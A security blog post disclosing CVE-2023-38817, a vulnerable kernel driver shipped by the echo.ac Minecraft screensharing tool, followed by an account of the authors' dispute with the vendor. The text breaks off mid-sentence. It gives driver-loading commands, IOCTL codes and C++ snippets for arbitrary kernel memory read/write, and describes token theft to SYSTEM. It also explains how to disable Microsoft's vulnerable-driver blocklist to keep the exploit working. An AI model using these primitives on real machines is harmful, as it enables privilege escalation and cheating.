<!DOCTYPE html>
<html lang="en" class="dark-mode">
<head>

    <title>EchOh-No! a Vulnerability and PoC demonstration in a popular Minecraft AntiCheat tool.</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=3193de83cc" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=3193de83cc" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=3193de83cc" />

    <meta name="description" content="CVE-2023-38817 - A vulnerability in a gaping security hole of a driver allows an attacker to attain nt authority\system privileges via a Privilege Escalation attack.">
    <link rel="canonical" href="https://ioctl.fail/echo-ac-writeup/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="ioctl.fail">
    <meta property="og:type" content="article">
    <meta property="og:title" content="EchOh-No! a Vulnerability and PoC demonstration in a popular Minecraft AntiCheat tool.">
    <meta property="og:description" content="CVE-2023-38817 - A vulnerability in a gaping security hole of a driver allows an attacker to attain nt authority\system privileges via a Privilege Escalation attack.">
    <meta property="og:url" content="https://ioctl.fail/echo-ac-writeup/">
    <meta property="og:image" content="https://ioctl.fail/content/images/2024/12/Fz2bn_WWIAArHOd.png">
    <meta property="article:published_time" content="2023-07-14T11:46:21.000Z">
    <meta property="article:modified_time" content="2024-12-22T16:39:45.000Z">
    <meta property="article:tag" content="Minecraft">
    <meta property="article:tag" content="PoC">
    <meta property="article:tag" content="Writeup">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="EchOh-No! A critical bug in a popular Anticheat tool.">
    <meta name="twitter:description" content="Easy arbitrary Kernel Read/Write by exploiting a gaping hole in the driver of an &quot;Anticheat&quot; tool.">
    <meta name="twitter:url" content="https://ioctl.fail/echo-ac-writeup/">
    <meta name="twitter:image" content="https://ioctl.fail/content/images/2024/12/Fz2bn_WWIAArHOd.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Whanos">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Minecraft, PoC, Writeup">
    <meta name="twitter:site" content="@WindowsKernel">
    <meta property="og:image:width" content="583">
    <meta property="og:image:height" content="361">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "ioctl.fail",
        "url": "https://ioctl.fail/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://ioctl.fail/favicon.ico",
            "width": 48,
            "height": 48
        }
    },
    "author": {
        "@type": "Person",
        "name": "Whanos",
        "url": "https://ioctl.fail/author/whanos/",
        "sameAs": []
    },
    "headline": "EchOh-No! a Vulnerability and PoC demonstration in a popular Minecraft AntiCheat tool.",
    "url": "https://ioctl.fail/echo-ac-writeup/",
    "datePublished": "2023-07-14T11:46:21.000Z",
    "dateModified": "2024-12-22T16:39:45.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://ioctl.fail/content/images/2024/12/Fz2bn_WWIAArHOd.png",
        "width": 583,
        "height": 361
    },
    "keywords": "Minecraft, PoC, Writeup",
    "description": "CVE-2023-38817 - A vulnerability in a gaping security hole of a driver allows an attacker to attain nt authority\\system privileges via a Privilege Escalation attack.",
    "mainEntityOfPage": "https://ioctl.fail/echo-ac-writeup/"
}
    </script>

    <meta name="generator" content="Ghost 5.105">
    <link rel="alternate" type="application/rss+xml" title="ioctl.fail" href="https://ioctl.fail/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/sodo-search.min.js" data-key="6f42950c32fde98450d9f0176d" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.5/umd/main.css" data-sodo-search="https://ioctl.fail/" data-locale="en" crossorigin="anonymous"></script>
    
    <link href="https://ioctl.fail/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=3193de83cc"></script><style>:root {--ghost-accent-color: #874efe;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=3193de83cc">
    <style>
/* Removes Header Button */
.gh-head-button {
    display: none!important;
}
/* Removes Footer CTA Section */
.footer-cta {
    display: none;
}
</style>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" integrity="sha512-vswe+cgvic/XBoF1OcM/TeJ2FW0OofqAVdCZiEYkd6dwGXthvkSFWOoGGJgS2CW70VK5dQM5Oh+7ne47s74VTg==" crossorigin="anonymous" referrerpolicy="no-referrer" />

</head>
<body class="post-template tag-minecraft tag-poc tag-writeup tag-hash-import-2024-12-22-16-13 is-head-left-logo has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="https://ioctl.fail">
                        ioctl.fail
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger" aria-label="Main Menu"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://ioctl.fail/">Home</a></li>
    <li class="nav-gpg-key"><a href="https://ioctl.fail/key/">GPG Key</a></li>
    <li class="nav-contact-me"><a href="https://ioctl.fail/contact/">Contact Me</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        



<main id="site-main" class="site-main">
<article class="article post tag-minecraft tag-poc tag-writeup tag-hash-import-2024-12-22-16-13 featured ">

    <header class="article-header gh-canvas">

        <div class="article-tag post-card-tags">
                <span class="post-card-primary-tag">
                    <a href="/tag/minecraft/">Minecraft</a>
                </span>
                <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
        </div>

        <h1 class="article-title">EchOh-No! a Vulnerability and PoC demonstration in a popular Minecraft AntiCheat tool.</h1>

            <p class="article-excerpt">CVE-2023-38817 - A vulnerability in a gaping security hole of a driver allows an attacker to attain nt authority\system privileges via a Privilege Escalation attack.</p>

        <div class="article-byline">
        <section class="article-byline-content">

            <ul class="author-list instapaper_ignore">
                <li class="author-list-item">
                    <a href="/author/whanos/" class="author-avatar author-profile-image" aria-label="Read more of Whanos"><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><g fill="none" fill-rule="evenodd"><path d="M3.513 18.998C4.749 15.504 8.082 13 12 13s7.251 2.504 8.487 5.998C18.47 21.442 15.417 23 12 23s-6.47-1.558-8.487-4.002zM12 12c2.21 0 4-2.79 4-5s-1.79-4-4-4-4 1.79-4 4 1.79 5 4 5z" fill="#FFF"/></g></svg>
</a>
                </li>
            </ul>

            <div class="article-byline-meta">
                <h4 class="author-name"><a href="/author/whanos/">Whanos</a></h4>
                <div class="byline-meta-content">
                    <time class="byline-meta-date" datetime="2023-07-14">14 Jul 2023</time>
                        <span class="byline-reading-time"><span class="bull">&bull;</span> 10 min read</span>
                </div>
            </div>

        </section>
        </div>

            <figure class="article-image">
                <img
                    srcset="/content/images/size/w300/2024/12/Fz2bn_WWIAArHOd.png 300w,
                            /content/images/size/w600/2024/12/Fz2bn_WWIAArHOd.png 600w,
                            /content/images/size/w1000/2024/12/Fz2bn_WWIAArHOd.png 1000w,
                            /content/images/size/w2000/2024/12/Fz2bn_WWIAArHOd.png 2000w"
                    sizes="(min-width: 1400px) 1400px, 92vw"
                    src="/content/images/size/w2000/2024/12/Fz2bn_WWIAArHOd.png"
                    alt="EchOh-No! a Vulnerability and PoC demonstration in a popular Minecraft AntiCheat tool."
                />
                    <figcaption><span style="white-space: pre-wrap;">Output from the PoC, showing a successful privilege escalation attack.</span></figcaption>
            </figure>

    </header>

    <section class="gh-content gh-canvas">
        <figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="https://ioctl.fail/content/images/2023/06/image-removebg-preview1.png" class="kg-image" alt="" loading="lazy" width="567" height="214"><figcaption><span style="white-space: pre-wrap;">Logo by my good friend and co-credited discoverer of this vulnerability, Zach.</span></figcaption></figure><p>PoC source code can be found here: <a href="https://github.com/kite03/echoac-poc?ref=ioctl.fail">https://github.com/kite03/echoac-poc</a>.</p><h1 id="cve-info">CVE Info</h1><ul><li>Number: CVE-2023-38817</li><li>Vendor: Inspect Element Ltd (13017981), trading as Echo.</li><li>Affected Products: echo.ac Anti-Cheat scanner tool.</li><li>Affected Versions: echo.ac - &lt;5.2.1.0, echo_driver.sys - All shipped versions.</li><li>Affected operating systems: 64Bit versions of Windows from; Windows 7 to Windows 11.</li><li>Mitigation: Do not use the software, and add driver signatures to blacklist.</li></ul><h1 id="credits">Credits</h1><ul><li>Protocol (Whanos): <a href="https://github.com/Whanos/?ref=ioctl.fail">GitHub Link</a> - Initial discovery, contact with echo.ac, and exploit development.</li><li>kite03: <a href="https://github.com/kite03/?ref=ioctl.fail">GitHub Link</a> - Exploit development, and writing.</li><li>Lemon (Wishes to stay anonymous): - Exploit development and assistance.</li></ul><h1 id="certificate-revoked">CERTIFICATE REVOKED</h1><p>Microsoft has added the Echo Driver to the Vulnerable Driver Blocklist and the certificate has been revoked.<br>If you still wish to use the exploit, <strong>you must enable test signing</strong> and disable the Microsoft Vulnerable Driver blocklist.</p><h1 id="background">Background</h1><p>echo.ac is a commercial "screensharing tool", marketed and developed mostly for the Minecraft PvP community, but also used by some other game communities - such as Rust. A "screensharing tool" is a program developed to "assist" server admins in identifying if someone's using cheats or similar banned external tools in-game, effectively a single-run Anti-cheat scanner. <br>As such - these programs execute numerous intrusive scans on a users computer, while being deliberately very vague of what they data collect and why.</p><p>Additionally, as these programs are for (terrible) Admins to "check if a user is cheating", they are given to the user under duress - as users will be threatened with a permanent ban from the server they were playing on if they refuse.<br>Furthermore, these users are usually quite young and <strong>do not understand the issue of running random executables on their personal computer</strong> (see the current plague of malware on Discord presently).</p><p>When this point was brought up to them, they reacted aggressively and attacked us for criticising this practice. We think that it is unfair that users can be banned for not wanting to run this invasive software.</p><p>I (Whanos/protocol) also attempted to disclose this exploit to the CEO in private before disclosing it publicly - to allow ample time for the developers to patch it, but they brushed me off, saying that it's not a bug - and then banning me from their discord server &amp; blocking me.</p><p>Thanks for reading!</p><h1 id="the-bug">The Bug</h1><p><code>echo-free.exe</code> - their client app, deploys a Kernel driver named <code>echo_driver.sys</code> to a newly generated folder in <code>%TEMP%</code>. This driver appears to be used mostly to scan and copy target processes memory so it can be analysed later to "check for cheats" (glorified string-searching tool...)</p><p>Unfortunately, this gaping security hole of a driver has no access controls on what programs can access it, making it trivial to abuse for all manners of exploits on the system.</p><p>Simply by using the following series of IOCTL codes, a local attacker can control the driver to Read and Write memory on the system. We abuse this in our PoC to read the Kernel's EPROCESS/KPROCESS block in memory, and then perform Access Token Theft using the driver - copying it into a newly spawned command shell of ours, which immediately escalates its privileges to <code>nt authority\system</code> (Highest system permissions).</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/image-1.png" class="kg-image" alt="" loading="lazy" width="665" height="399" srcset="https://ioctl.fail/content/images/size/w600/2024/12/image-1.png 600w, https://ioctl.fail/content/images/2024/12/image-1.png 665w"><figcaption><span style="white-space: pre-wrap;">Uh oh.</span></figcaption></figure><h2 id="the-attack">The Attack</h2><ul><li>Firstly, create the service and start the driver using <code>sc create EchoDrv binpath=C:\PathToDriver.sys type= kernel &amp;&amp; sc start EchoDrv</code> .</li><li>Next, get a handle to the driver, which uses device path <code>\\\\.\\EchoDrv</code>.</li><li>Now execute IOCTL code <code>0x9e6a0594</code> to bypass an internal check - shown later.</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-cpp">// Yes, this buffer seems useless - but without it the driver BSOD's the PC.
// Create a buffer to store useless data (we don't care about it)
void* buf = (void*)malloc(4096);

// Call IOCTL that sets the internal PID variable and gets past the DWORD check
// 0x9e6a0594 - IOCTL Code
DeviceIoControl(hDevice, 0x9e6a0594, NULL, NULL, buf, 4096, NULL, NULL);</code></pre><figcaption><p><span style="white-space: pre-wrap;">Code Example</span></p></figcaption></figure><ul><li>Set the PID to the exploiting program by using IOCTL code <code>0xe6224248</code>, this returns a HANDLE to your provided PID.</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-cpp">// The data struct the driver is expecting
struct k_get_handle {
    DWORD pid;
    ACCESS_MASK access;
    HANDLE handle;
};

k_get_handle param{};
// Set the PID and access we want.
param.pid = GetCurrentProcessId();
param.access = GENERIC_ALL;
// Call the driver
DeviceIoControl(hDevice, 0xe6224248, &amp;param, sizeof(param), &amp;param, sizeof(param), NULL, NULL);

// Return the HANDLE. We'll need it later in all calls.
return param.handle;</code></pre><figcaption><p><span style="white-space: pre-wrap;">Code Example</span></p></figcaption></figure><ul><li>Finally - you can use IOCTL code <code>0x60a26124</code> to make the driver execute <code>MmCopyVirtualMemory</code> with your given arguments, allowing the arbitrary Memory Read/Write.</li></ul><figure class="kg-card kg-code-card"><pre><code class="language-cpp">// Data structure
struct k_param_readmem {
    HANDLE targetProcess;
    void* fromAddress;
    void* toAddress;
    size_t length;
    void* padding;
    uint32_t returnCode;
};

// Here is a simple read memory driver we use extensively in this PoC.
BOOL read_memory_raw(void* address, void* buf, size_t len, HANDLE targetProcess) {
 	k_param_readmem req{};
 	req.fromAddress = (void*)address;
 	req.length = len;
	req.targetProcess = targetProcess;
 	req.toAddress = (void*)buf;

	BOOL success = DeviceIoControl(hDevice, 0x60a26124, &amp;req, sizeof(k_param_readmem), &amp;req, sizeof(k_param_readmem), NULL, NULL);
	return success;
}

// An example using the above function could be something like this

// Get the PID of the System
DWORD systemPID;
Driver.read_memory_raw(
	(void *) (PsInitialSystemProcessEPROCESS + PIDOffset),
    &amp;systemPID,
 	sizeof(systemPID),
	processHandle
);</code></pre><figcaption><p><span style="white-space: pre-wrap;">Code Example</span></p></figcaption></figure><p>One thing to note is that the driver does not have a "write" function, but you can simply flip the <code>to</code> and <code>from</code> address parameters to "read" your data buffer into another program just fine.</p><ul><li>Stop and remove the driver from your system by executing <code>sc stop EchoDrv &amp;&amp; sc delete EchoDrv</code>.</li></ul><h1 id="why-this-works">Why This Works</h1><p>The first IOCTL calls this function, which we seems to sets the output buffer for some internal BCrypt operations we frankly do not care about. Without this call the driver does not listen our commands.</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">if (IOCTLCode == 0x9e6a0594) {
	// First, get the output address
	BCryptOutputBuffer = *IRP-&gt;AssociatedIrp.SystemBuffer;
    // Run some BCrypt stuff and output to buffer
	NTSTATUS status = BCryptStuff(*BCryptOutputBuffer, sizeof(BCryptOutputBuffer) + 1);
	if (NT_SUCCESS(status)) {
      *(undefined *)(BCryptOutputBuffer + 2) = 1;
    }
    *(undefined4 *)((longlong)BCryptOutputBuffer + 0x14) = 0x1000;
  }</code></pre><figcaption><p><span style="white-space: pre-wrap;">A simplified version of the BCrypt buffer IRP Handler.</span></p></figcaption></figure><p>The next IOCTL looks up the PEPROCESS data of our given process' PID and stores it internally - then returns a HANDLE which much be provided in all subsequent requests. This appears to be the driver's "Access Control" - which is frankly, awful.</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">if (IOCTLCode == 0xe6224248) {
	// Shared IRP data buffer
	ProgramPIDStruct = *(k_get_handle)IRP-&gt;AssociatedBuffer.SystemBuffer;
	OurProcess = NULL;
	NTSTATUS status = PsLookupProcessByProcessId(*ProgramPIDStruct,&amp;OurProcess);
	if (NT_SUCCESS(status)) {
		status = ObOpenObjectByPointer(OurProcess,0,0,ProgramPIDStruct[1]);
		if (NT_SUCCESS(status) {
			if (OurProcess != NULL) {
				ObfDereferenceObject(OurProcess);
			}
			// Set our HANDLE in shared buffer struct
			*(HANDLE)ProgramPIDStruct = InternalHandle;
			// Unused
			*(undefined *)(ProgramPIDStruct + 4) = 1;
		}
	}
	// Unused
	ProgramPIDStruct[5] = 0x1001;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">Set PID IRP handler.</span></p></figcaption></figure><p>Finally, we can use the driver's Copy Memory IOCTL to do whatever we want with memory. Our parameters are directly fed into a <code>CopyMemory</code> function - which basically is just a wrapper for <code>MmCopyVirtualMemory</code>.</p><figure class="kg-card kg-code-card"><pre><code class="language-cpp">if (IOCTLCode == 0x60a26124) {
    IRPBuffer = *(HANDLE)IRP-&gt;AssociatedBuffer.SystemBuffer;
    OurProcess = NULL;
    // Check driver has access to given HANDLE
    NTSTATUS status = ObReferenceObjectByHandle( * IRPBuffer, 0, *(POBJECT_TYPE * ) PsProcessType_exref, '\0', &amp; OurProcess,
        (POBJECT_HANDLE_INFORMATION) 0x0);
    if (NT_SUCCESS(status)) {
		// Call CopyMemory function with our parameter
        status = CopyMemory(OurProcess, IRPBuffer[1], (PVOID * ) IRPBuffer[2], (size_t * ) IRPBuffer[3],
            (PSIZE_T)(IRPBuffer + 4));
        // NT_SUCCESS
        if (NT_SUCCESS(status) {
			// Set Return Code
            *(IRPBuffer + 5) = 1;
        }
    }
    if (OurProcess != NULL) {
        ObfDereferenceObject(OurProcess);
    }
	// Unused
    *(undefined4 * )((longlong) IRPBuffer + 0x2c) = 0x1002;
    UVar5 = 0x30;
    goto LAB_140001b03;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">The Read memory IRP handler.</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-cpp">NTSTATUS CopyMemory(PEPROCESS TargetProcess, void * FromAddress, PVOID * ToAddress, size_t * BufferSize, PSIZE_T BytesCopied)
{
    NTSTATUS status;
    PEPROCESS ToProcess;
    uint StatusCode;

    ToProcess = IoGetCurrentProcess();
    status = MmCopyVirtualMemory(TargetProcess, FromAddress, ToProcess, ToAddress, BufferSize, 0,
        BytesCopied);
    StatusCode = 0;
    // 0xC0000022 - STATUS_ACCESS_DENIED
    if (!NT_SUCCESS(status)) {
        StatusCode = 0xc0000022;
    }
    return (NTSTATUS)StatusCode;
}</code></pre><figcaption><p><span style="white-space: pre-wrap;">CopyMemory function. It's basically just a MmCopyVirtualMemory wrapper.</span></p></figcaption></figure><p>Specifically, <strong><code>MmCopyVirtualMemory</code> </strong>is an mostly undocumented Windows API function which allows a Driver to copy the Virtual Memory of a given process.</p><p>Also, the function is being executed at Kernel level - indicated by parameter <code>0</code> in the call above - which is <code>KPROCESSOR_MODE_KERNEL</code>!</p><p>In short, this means our exploit allows direct access to a Kernel mode memory context via simple IO requests from user-mode.</p><p>As you can see, the complete lack of access control or validation causes this driver to become effectively - A "Security-Hole As A Service".</p><h2 id="extra-driver-info">Extra Driver Info</h2><ul><li>The driver was built on June 18th 2021, so we can presume that <strong>all</strong> client program versions from that point onwards are vulnerable.</li><li>The vulnerable driver's SHA256 hash is <code>ea3c5569405ed02ec24298534a983bcb5de113c18bc3fd01a4dd0b5839cd17b9</code>.</li><li>The vulnerable driver's MD5 hash is <code>187ddca26d119573223cf0a32ba55a61</code>.</li></ul><h1 id="the-uses">The Uses</h1><p>There are several uses for this exploit - having Kernel level memory access to anything on the system is very dangerous and abusable!</p><p>For our example, we perform a privilege escalation attack using it.</p><h2 id="privilege-escalation">Privilege Escalation</h2><p>In the GitHub repository there is a working <a href="https://github.com/kite03/echoac-poc/tree/main/PoC/PrivilegeEscalation?ref=ioctl.fail">Privilege Escalation attack</a> which allows an attacking process to make any process run with <code>nt authority\system</code> privileges.<br>This is dangerous because this has more permissions than any other user on the system, which could be easily used by malware to cause much more damage!</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/cmd_fCRmgemv5C.png" class="kg-image" alt="" loading="lazy" width="1557" height="522" srcset="https://ioctl.fail/content/images/size/w600/2024/12/cmd_fCRmgemv5C.png 600w, https://ioctl.fail/content/images/size/w1000/2024/12/cmd_fCRmgemv5C.png 1000w, https://ioctl.fail/content/images/2024/12/cmd_fCRmgemv5C.png 1557w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The default token privileges of a process running as a regular administrator.</span></figcaption></figure><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/cmd_b9e6bEsrik.png" class="kg-image" alt="" loading="lazy" width="1630" height="693" srcset="https://ioctl.fail/content/images/size/w600/2024/12/cmd_b9e6bEsrik.png 600w, https://ioctl.fail/content/images/size/w1000/2024/12/cmd_b9e6bEsrik.png 1000w, https://ioctl.fail/content/images/size/w1600/2024/12/cmd_b9e6bEsrik.png 1600w, https://ioctl.fail/content/images/2024/12/cmd_b9e6bEsrik.png 1630w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">The default token privileges of a process running at </span><code spellcheck="false" style="white-space: pre-wrap;"><span>nt authority\system</span></code><span style="white-space: pre-wrap;"> - notice how many more privileges it has!</span></figcaption></figure><h2 id="cheating">Cheating</h2><p>Additionally, this exploit can be (and has been) extensively used for Cheating in video games - it turns out that this driver was seemingly <strong>whitelisted</strong> by Easy Anti Cheat (EAC) - one of the most popular commercial Anti-Cheat providers - allowing cheaters to trivially cheat in games protected by it!</p><p>This is due to the fact that back in ~May 2022, hundreds of echo's own users were banned by EAC in series of large ban waves - due to echo's methodology of mass-memory scanning all programs on a user's computer (a really <strong>big</strong> no-no for all Anti-Cheats!).</p><p>Somehow, echo managed to convince EAC to unban all the users affected by this - and seemingly whitelist their driver from being detected - all the whilst not patching the arbitrary memory Read/Write exploit described above!</p><p>In fact, after speaking with some cheater developers about this - some were abusing this to cheat in games such as Rust for almost a year prior to this writeup!</p><h2 id="other-projects">Other Projects</h2><ul><li>Program protector (PPL stripper/adder) by sam (Video was struck down by YouTube)</li><li><a href="https://github.com/hfiref0x/KDU?ref=ioctl.fail" rel="noreferrer">KDU by hfiref0x</a></li></ul><p></p><h2 id="in-media">In Media</h2><figure class="kg-card kg-embed-card kg-card-hascaption"><blockquote class="twitter-tweet"><p lang="en" dir="ltr">Thank you <a href="https://twitter.com/WindowsKernel?ref_src=twsrc%5Etfw&ref=ioctl.fail">@WindowsKernel</a> for the great add to <a href="https://twitter.com/hashtag/LOLDrivers?src=hash&ref_src=twsrc%5Etfw&ref=ioctl.fail">#LOLDrivers</a>! This is THE read you need for the weekend!<a href="https://t.co/WB155xzo6D?ref=ioctl.fail">https://t.co/WB155xzo6D</a><a href="https://t.co/601sw51Dm7?ref=ioctl.fail">https://t.co/601sw51Dm7</a> <a href="https://t.co/3Vjlp4tVoI?ref=ioctl.fail">https://t.co/3Vjlp4tVoI</a> <a href="https://t.co/Js3RG54xhU?ref=ioctl.fail">pic.twitter.com/Js3RG54xhU</a></p>— The Haag™ (@M_haggis) <a href="https://twitter.com/M_haggis/status/1679972509150777344?ref_src=twsrc%5Etfw&ref=ioctl.fail">July 14, 2023</a></blockquote>
<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><figcaption><p><span style="white-space: pre-wrap;">The loldrivers.io maintainer loved it :)</span></p></figcaption></figure><figure class="kg-card kg-embed-card kg-card-hascaption"><iframe width="200" height="113" src="https://www.youtube.com/embed/7YcPMmVSTto?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" title="Minecraft Mods Can Hack You"></iframe><figcaption><p><span style="white-space: pre-wrap;">NTTS included it in an incredible video!</span></p></figcaption></figure><h2 id="thats-the-end-of-the-exploit-writeup">That's the end of the exploit writeup!</h2><p>Thank you very much for reading.</p><p>The following section documents our conversations with the echo team and CEO, for clarity.</p><h1 id="the-aftermath">The Aftermath</h1><p>First and foremost: Please do <strong>not </strong>harass anyone mentioned in this document. While some people might've gone too far in some aspects - harassment is <strong>not</strong> okay. Do not stoop to that level - thanks.</p><h2 id="echo-and-data">Echo and Data</h2><p>Echo.ac is pretty quiet about the data it collects and why. Their own ToS on their website and scanning app does <strong>not</strong> tell us <em>what</em> data is scanned and what exactly they will do with it.</p><p>ToS archived as of writing (~29th of June 2023):</p><ul><li>Website Screenshot 1: <a href="https://cdn.gls.cx/41fb30ea18f9631b?ref=ioctl.fail">Screenshot</a></li><li>Website Screenshot 2: <a href="https://cdn.gls.cx/a665190b66c33c66?ref=ioctl.fail">Screenshot</a></li></ul><p>Update 15/07/2023: As requested by Josh on his alt (that he has me blocked me on already), I have removed the statement saying the in app privacy policy is the same as the website's.</p><p>There are only 2 hints we get as to the data that they collect. </p><p>First are the result pages people publicly share in their discord. An example of which can be found <a href="https://scan.echo.ac/cd36a1b1-9744-41b8-b8b3-83ca9bff1cfd?ref=ioctl.fail">here</a>. <br>Not much information can really be extrapolated from here, unfortunately. <br>(Screenshots, in case they delete this scan): </p><ul><li><a href="https://cdn.gls.cx/64d7cc8fea95615a?ref=ioctl.fail">Part One</a></li><li><a href="https://cdn.gls.cx/8e6d6fba0ff37156?ref=ioctl.fail">Part Two</a></li><li><a href="https://cdn.gls.cx/f2785539b72a1065?ref=ioctl.fail">Part Three</a></li></ul><p>Second, the policy that they publish.<br>This policy is supposed to provide some transparency as to what data echo collects. It is assumed that, for ethical reasons if nothing else - a rough outline to the methods used to collect data are stated. Unfortunately, this policy is not trustworthy. <br>This is because Echo has changed is policy regarding what they collect after the following interactions. <br>Note that they still collect this data, they just don't tell their users anymore. <br>They aren't being open as to what information they collect, and are clearly happy to hide things from their policy if it helps them evade criticism!</p><p>Consider the following tweet.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/e57fcaaef3e93fb6.png" class="kg-image" alt="" loading="lazy" width="573" height="338"><figcaption><span style="white-space: pre-wrap;">This tweet brings up a very valid argument.</span></figcaption></figure><p><strong>Since Bulbasaur's tweet was posted, they removed the line in their website about storing the memory of processes on the computer, but yet they still do it!</strong></p><p>After that tweet, they updated their "What do we log" FAQ:</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/777c3b6e8dbb01d9.png" class="kg-image" alt="" loading="lazy" width="846" height="195" srcset="https://ioctl.fail/content/images/size/w600/2024/12/777c3b6e8dbb01d9.png 600w, https://ioctl.fail/content/images/2024/12/777c3b6e8dbb01d9.png 846w" sizes="(min-width: 720px) 720px"><figcaption><span style="white-space: pre-wrap;">Notice the omission of the sentence about them logging Process Memory!</span></figcaption></figure><p>How shady.</p><h2 id="my-initial-contact">My Initial Contact</h2><p>On the 24th of May 2023, I (protocol/Whanos) published a tweet to my personal Twitter account (@WindowsKernel) - sharing my concerns with Echo.AC, as well as sharing a tria.ge link, which reported suspicious behaviour from the Echo.AC client.</p><figure class="kg-card kg-embed-card kg-card-hascaption"><blockquote class="twitter-tweet"><p lang="en" dir="ltr">please do not run random “screensharing tools” cause a Minecraft server admin wants to check if ur cheating 💀💀💀<br><br>specifically talking about <a href="https://twitter.com/echodotac?ref_src=twsrc%5Etfw&ref=ioctl.fail">@echodotac</a> , a “screensharing tool” that scans your computer to “detect cheats”. Why would a scanning tool need to load a kernel driver? <a href="https://t.co/5tAc31GsYE?ref=ioctl.fail">pic.twitter.com/5tAc31GsYE</a></p>— i am eating your IOCTLs (@WindowsKernel) <a href="https://twitter.com/WindowsKernel/status/1661424238803156997?ref_src=twsrc%5Etfw&ref=ioctl.fail">May 24, 2023</a></blockquote>
<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><figcaption><p><span style="white-space: pre-wrap;">My tweet. Archived screenshot: https://cdn.gls.cx/5c91602e6d41fec2</span></p></figcaption></figure><p>My tweet - albeit being a bit sensationalised - didn't contain anything untrue, and was more of a general warning to not execute applications that random server admins request you to run on your PC. </p><p>At the time, my tweet only had interactions from my own followers - as I mostly post about cybersecurity to a relatively small audience.<br>However - shortly after it was posted, the CEO of the company behind Echo.AC - Josh, and some developers and associates of Echo.AC responded with what could frankly only be described as hate-mail and bullying.</p><p>Most of these replies are still viewable on the original tweet, but as a precaution I screenshotted them for posterity.</p><p>Additionally, I received this DM from Josh, the CEO.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://ioctl.fail/content/images/2024/12/3d259502f60b4d18.png" class="kg-image" alt="" loading="lazy" width="599" height="1088"><figcaption><span style="white-space: pre-wrap;">Cheers, Josh.</span></figcaption></figure><h1 id="the-disclosure-attempt">The Disclosure Attempt</h1><p>Steeled by this insane series of interactions, my friends and I (credited at the top) started digging into their driver to look for vulnerabilities. <br>Unsurprisingly, it was trivial to discover the exploit.</p><p>After we found the bug, we started preparing this writeup - and in the meantime I wanted to responsibly let the CEO know about the bug, so they can fix it before we release the writeup. <br>Shockingly, they brushed it off as it not being an 